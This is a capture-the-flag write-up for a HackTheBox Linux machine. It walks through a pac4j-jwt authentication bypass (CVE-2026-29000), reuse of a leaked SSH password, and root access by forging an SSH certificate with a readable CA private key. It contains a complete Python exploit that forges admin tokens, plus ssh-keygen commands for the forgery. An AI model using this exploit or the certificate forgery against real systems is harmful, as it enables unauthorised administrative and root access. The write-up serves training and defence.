---
title: "Principal"
date: 2026-06-18
categories: [HackTheBox, Medium]
tags: [linux, ssh, JWT, scripting, CA private key]
image:
  path: /assets/img/HTB/Principal/banner.png
  alt: Principal writeup
---


Java/Jetty internal platform protected by pac4j-jwt 6.0.3, vulnerable to **CVE-2026-29000** — a JWE wrapper around a `PlainJWT` (alg:none) bypasses signature verification entirely, granting forged `ROLE_ADMIN` access and exposing reusable SSH credentials in the admin panel. Privilege escalation via an SSH user-CA misconfiguration: the `deployers` group holds read access on the CA private key trusted by sshd, allowing certificate forgery for arbitrary principals including `root`.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Easy                |
| OS         | Linux               |
| IP         | 10.129.27.127       |
| Date       | June 2026           |


## Tools Used

| Tool                  | Description                                                                          |
|-----------------------|--------------------------------------------------------------------------------------|
| ping                  | ICMP utility to verify host reachability                                             |
| nmap                  | Network port scanner and service fingerprinter                                       |
| Web browser           | Manual web application exploration and source-code inspection                        |
| Python 3 (jwcrypto)   | Used to build the PlainJWT and wrap it inside a valid JWE                            |
| Browser DevTools      | To inject the forged token into `sessionStorage` and reload as admin                 |
| ssh                   | OpenSSH client for foothold (password) and privilege escalation (certificate)        |
| find                  | Used to enumerate filesystem objects owned by the `deployers` group                  |
| ssh-keygen            | Used both to generate a fresh RSA keypair and to sign it with the captured user CA   |

## Reconnaissance & Enumeration

The objective of this phase was to map the attack surface and identify which service exposed an entry point.

### Host Discovery

Reachability was confirmed with ICMP. The TTL of 63 (default Linux TTL is 64, decremented once across the routing hop) gave an early OS hint:

```bash
ping -c 1 10.129.27.127
PING 10.129.27.127 (10.129.27.127) 56(84) bytes of data.
64 bytes from 10.129.27.127: icmp_seq=1 ttl=63 time=43.9 ms
```

### Port Scan

A SYN scan across all 65535 TCP ports at a high packet rate. `-Pn` skipped host discovery (ICMP already confirmed liveness) and `-n` disabled reverse DNS:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.27.127 -oG allPorts
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

Only two ports responded — SSH and a non-standard HTTP service on 8080. A targeted scan with default scripts and version detection followed:

```bash
sudo nmap -p22,8080 -sCV 10.129.27.127 -oN nmap
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-server-header: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
```

Three details stood out immediately. The web server is **Jetty** (Java), the application is titled *Principal Internal Platform*, and — most importantly — the response headers leaked the **authentication framework and exact version**: **`pac4j-jwt/6.0.3`**. The `X-Powered-By` header on a security-critical component is itself a minor info leak, but the real value is the precise version pin: it lets us look up known CVEs immediately rather than fingerprinting by behavior.

### Web Application

Browsing to `http://10.129.27.127:8080/` redirected to `/login` and displayed a login form with the footer disclosure:

```text
v1.2.0 | Powered by pac4j
```

pac4j-jwt 6.0.3 is affected by **CVE-2026-29000**, a pre-authentication flaw in how the library handles nested JWT-in-JWE constructions. Before crafting an exploit it was worth understanding how the application uses the framework, so I inspected the client-side bundle at `/static/app.js`. The relevant block was a developer comment documenting the entire token scheme:

```javascript
/**
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */
```

This is everything an attacker needs in plain English: the exact JWE key wrapping algorithm (`RSA-OAEP-256`), the inner JWT signing algorithm (`RS256`), the URL of the public key (`/api/auth/jwks`), and the full claims schema (`sub`, `role`, `iss`, `iat`, `exp`) — including the valid role values. With this in hand, exploiting CVE-2026-29000 is just a matter of producing a token whose inner payload says `role: ROLE_ADMIN`.

## Exploitation

### CVE-2026-29000 — JWE wrapping a PlainJWT bypasses signature verification

pac4j-jwt 6.0.3 accepts tokens whose outer envelope is a valid JWE (encrypted with the server's public RSA key) and whose inner payload is, per the design, a signed RS256 JWT. The vulnerability is that the library does **not** require the inner payload to be a signed JWT — it accepts a **`PlainJWT`** (a JWT with `alg: none` in its header and an empty signature segment). Because the outer JWE was successfully decrypted with the server's private key, the library treats the resulting plaintext as authentic and trusts the claims **without verifying any signature**.

The attacker therefore needs only three things:

1. The server's **RSA public key** (published at `/api/auth/jwks` for token verification purposes — but it's the same key needed for JWE encryption).
2. The **claim schema** (already documented in the app.js comment).
3. A library that can build an unsigned JWT and wrap it in a JWE — Python's `jwcrypto` handles both.

The full PoC builds the PlainJWT manually (header `{"alg":"none"}`, the desired admin claims, empty signature), then encrypts it inside a JWE using the server's public RSA key retrieved from the JWKS endpoint:

```python
#!/usr/bin/env python3
"""
CVE-2026-29000 - pac4j-jwt JWE PlainJWT Authentication Bypass
Target: Principal Internal Platform
"""
import json
import time
import base64
import requests
from jwcrypto import jwk, jwt as jwcrypto_jwt

TARGET = "http://10.129.27.127:8080"

# ── helpers ──────────────────────────────────────────────────────────────────
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def build_plain_jwt(claims: dict) -> str:
    """Construye un PlainJWT (alg: none) sin firma."""
    header  = b64url_encode(json.dumps({"alg": "none"}, separators=(",", ":")).encode())
    payload = b64url_encode(json.dumps(claims,           separators=(",", ":")).encode())
    return f"{header}.{payload}."

# ── paso 1: obtener JWKS ─────────────────────────────────────────────────────
print("[*] Fetching JWKS...")
jwks_resp = requests.get(f"{TARGET}/api/auth/jwks")
jwks_resp.raise_for_status()
jwks_data = jwks_resp.json()
print(f"[+] JWKS: {json.dumps(jwks_data, indent=2)}")

pub_key = jwk.JWK(**jwks_data["keys"][0])

# ── paso 2: construir el PlainJWT con claims de admin ────────────────────────
now = int(time.time())
claims = {
    "sub":  "admin",
    "role": "ROLE_ADMIN",
    "iss":  "principal-platform",
    "iat":  now,
    "exp":  now + 86400
}

plain_token = build_plain_jwt(claims)
print(f"\n[*] PlainJWT (alg:none):\n    {plain_token}")

# ── paso 3: envolver el PlainJWT en un JWE ───────────────────────────────────
token = jwcrypto_jwt.JWT(
    header={
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": pub_key.key_id
    },
    claims=plain_token
)
token.make_encrypted_token(pub_key)
forged = token.serialize()

print(f"\n[+] Forged JWE token:\n    {forged}")

# ── paso 4: probar el token ───────────────────────────────────────────────────
headers = {"Authorization": f"Bearer {forged}"}

print("\n[*] Testing /api/dashboard...")
r = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"    Status: {r.status_code}")
if r.ok:
    print(f"    Response: {json.dumps(r.json(), indent=2)}")

print("\n[*] Testing /api/users (admin-only)...")
r = requests.get(f"{TARGET}/api/users", headers=headers)
print(f"    Status: {r.status_code}")
if r.ok:
    print(f"    Response: {json.dumps(r.json(), indent=2)}")

print("\n[*] Testing /api/settings (admin-only)...")
r = requests.get(f"{TARGET}/api/settings", headers=headers)
print(f"    Status: {r.status_code}")
if r.ok:
    print(f"    Response: {json.dumps(r.json(), indent=2)}")
```

The critical detail is the value passed as the `claims` argument to `jwcrypto_jwt.JWT`: it's **not** a Python dict (which would produce a normal nested JWT-in-JWE), it's the raw `PlainJWT` string with `alg: none`. The library happily wraps that string verbatim as the JWE plaintext, which is exactly the construction CVE-2026-29000 exploits — a valid JWE envelope whose inner payload is an unsigned JWT.

Running it against the target produces the JWKS fetch, the PlainJWT, and the final forged JWE in one shot:

```bash
python3 exploit.py
[*] Fetching JWKS...
[+] JWKS: {
  "keys": [
    {
      "kty": "RSA",
      "use": "enc",
      "kid": "enc-key-1",
      "alg": "RSA-OAEP-256",
      "n": "...",
      "e": "AQAB"
    }
  ]
}

[*] PlainJWT (alg:none):
    eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiaXNzIjoicHJpbmNpcGFsLXBsYXRmb3JtIiwiaWF0IjoxNzUwMjUyOTM2LCJleHAiOjE3NTAzMzkzMzZ9.

[+] Forged JWE token:
    eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIiwia2lkIjoiZW5jLWtleS0xIn0.W76r68f1pIJILTiTdL47YydEebrhDjvDCoT2NUv7PaNG8ZAaT02zFxLrbMFVdzCmxv5be...TRUNCATED...kZXMp38DTKKQvTh.xT5_Ssu7GxVlSf9vEo4_lA
```

Note how the PlainJWT ends with a trailing dot and no signature data — that's the `alg: none` payload that should never have been accepted, but pac4j-jwt 6.0.3 reads it as legitimate after the JWE decryption succeeds. The outer JWE header decodes to `{"alg":"RSA-OAEP-256","enc":"A128GCM","kid":"enc-key-1"}` — a perfectly valid envelope that gives the library no reason to flag the request.

### Injecting the Forged Token

From the same `app.js`, the client-side `TokenManager` stores the JWT in `sessionStorage` under the key `auth_token` and sends it as a `Bearer` header on every API call. There's no signed cookie, no server-side session — the entire authentication state lives in that one token.

That made injection trivial. In the browser, after navigating to the login page, I opened DevTools and ran:

```javascript
sessionStorage.setItem('auth_token', '<forged JWE>')
location.href = '/dashboard'
```

The dashboard loaded fully as `admin / ROLE_ADMIN` — the `renderNavigation()` call from `app.js` rendered the *Users* and *Settings* nav entries that are gated to `ROLES.ADMIN`, and the rest of the panel populated from `/api/dashboard` without any further authentication challenge.

### Loot from the Admin Panel

Once inside, two screens were immediately useful.

**Settings → Security panel** disclosed several internal configuration values. The interesting field was `encryptionKey`, whose value was an obvious password rather than the symmetric key its label suggested:

![Settings panel exposing encryptionKey value](/assets/img/HTB/Principal/web2.png)

```text
encryptionKey: D3pl0y_$$H_Now42!
```

The value `D3pl0y_$$H_Now42!` reads phonetically as *Deploy SSH Now* — strongly hinting that the same string is used as a service-account SSH password somewhere on the box. That hypothesis got immediate corroboration from the next panel.

**Users panel** listed every account in the application with role, department and a free-form *Notes* column:

![Users table revealing the svc-deploy service account](/assets/img/HTB/Principal/web3.png))

The standout entry was **`svc-deploy`** with role `deployer` and the note *"Service account for automated deployments via SSH certificate auth."* — a system account specifically described as having SSH access. The naming pattern matches the leaked credential's hint (*Deploy*), so reusing the credential against SSH on that account was the obvious test:

```bash
ssh svc-deploy@10.129.27.127
svc-deploy@10.129.27.127's password: D3pl0y_$$H_Now42!
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
svc-deploy@principal:~$
```

Credential reuse confirmed — the same string did double duty as both an `encryptionKey` setting in the admin panel and the SSH password for the `svc-deploy` Linux account. The user flag was readable from `svc-deploy`'s home directory:

```bash
cat user.txt
```

## Privilege Escalation — `svc-deploy` → `root`

With a shell as `svc-deploy`, the standard privilege-escalation enumeration began. The first thing that stood out was the user's group membership:

```bash
id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

The custom `deployers` group is exactly the kind of non-default group that often gates access to sensitive infrastructure files. The natural next step is to find every filesystem object owned by that group:

```bash
find / -group deployers 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

Four hits, and the names alone hinted strongly at SSH certificate-based authentication infrastructure. I checked the sshd configuration drop-in first, because it would tell me what role `/opt/principal/ssh/ca` actually plays for the SSH service:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

This is the central misconfiguration. The directive **`TrustedUserCAKeys /opt/principal/ssh/ca.pub`** tells sshd to **trust any user certificate signed by that CA** — meaning anyone holding the CA's *private* key can mint a valid SSH certificate for any principal the CA chooses to authorize, including `root`. Combined with `PermitRootLogin prohibit-password` (which forbids password auth for root but **explicitly allows key/certificate auth**), the system is one stolen private key away from unrestricted root access.

The README confirmed the intended workflow, which is benign on paper:

```bash
cat /opt/principal/ssh/README.txt
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.
Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

The architecture itself is fine — short-lived SSH certificates issued by a CA are a common best practice for automated deployments. The mistake is in the file permissions. Listing the CA directory revealed the actual bug:

```bash
ls -la /opt/principal/ssh
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
```

The CA **private key** (`ca`, mode `640`) is readable by the `deployers` group, and `svc-deploy` is a member of that group. The CA private key should only ever be readable by the issuing service running as a dedicated, locked-down user — exposing it to every member of a shared group means every such member effectively has unrestricted root.

### Forging a Root Certificate

With read access to the CA private key, forging an SSH user certificate for `root` is a three-step procedure using only standard `ssh-keygen` invocations.

First, generate a fresh RSA keypair locally. This is the keypair whose public half we'll ask the CA to sign:

```bash
ssh-keygen -t rsa -b 4096 -f id_forged -N ""
Generating public/private rsa key pair.
Your identification has been saved in id_forged
Your public key has been saved in id_forged.pub
The key fingerprint is:
SHA256:0S+Uh9CESo17agvwD9DXtL0cyEj9x6A8EPIJywUNJeM svc-deploy@principal
```

Second, sign the public half with the CA, specifying the principals (usernames the certificate is authorized to log in as) and a validity period:

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "principal-cert" -n root,admin,deploy,principal -V +1d id_forged.pub
Signed user key id_forged-cert.pub: id "principal-cert" serial 0 for root,admin,deploy,principal valid from 2026-06-18T15:00:00 to 2026-06-19T15:00:00
```

The flags break down as follows. `-s /opt/principal/ssh/ca` selects the CA private key for signing — this is the file `svc-deploy` should never have been able to read. `-I "principal-cert"` sets a free-form identifier string for logging purposes; it has no security weight. `-n root,admin,deploy,principal` is the security-critical flag: it lists every principal (username) the certificate is authorized to authenticate as, and including `root` here is what turns the forgery into privilege escalation. `-V +1d` bounds validity to 24 hours, which avoids tripping any monitoring that flags suspiciously long-lived certificates.

The output is `id_forged-cert.pub` — the signed certificate, which `ssh` will pick up automatically when invoked with `-i id_forged` because it lives alongside the private key.

Third, use the certificate to SSH in as root, against the local sshd (which trusts the CA):

```bash
ssh -i id_forged root@127.0.0.1
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
Last login: Thu Jun 18 15:08:35 2026 from 127.0.0.1
root@principal:~# cat root.txt
```

sshd accepted the connection because the presented certificate was signed by `/opt/principal/ssh/ca.pub` (declared trusted in `60-principal.conf`) and listed `root` among its valid principals.

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **The `X-Powered-By` header is rarely worth the operational convenience.** Pinning the exact version of an auth framework gives an attacker the precise CVE lookup they need before they've even logged in. The application's own JavaScript bundle further volunteered the entire token schema in a comment, removing every remaining unknown.
- **Decryption is not authentication.** CVE-2026-29000 hinges on a recurring conceptual error in nested-token designs: successfully decrypting a JWE with the recipient's private key proves only that the sender knew the public key (which is public), not that the sender holds anything secret. The inner JWT's signature is the only thing that authenticates the claims, and any code path that accepts an unsigned inner JWT is fatally broken regardless of how strong the outer envelope's crypto is.
- **Credential labels lie.** A field called `encryptionKey` in an admin settings panel turned out to be the SSH password for a service account. Admin panels routinely expose secrets out of operational convenience, and the mismatch between a credential's stated purpose and its actual reuse is precisely the kind of gap attackers look for. The presence of any reusable-looking string in a privileged UI should be assumed compromising.
- **SSH user CAs concentrate trust.** `TrustedUserCAKeys` is a powerful and legitimate mechanism, but a CA private key holds the same effective authority as a passwordless root key for every host that trusts it. The correct mode is `0600 root:root` and the correct exposure surface is exactly one service running as a dedicated user. Granting a shared group like `deployers` read access on the private half is functionally equivalent to handing every group member a passwordless root login on every machine in the trust scope.
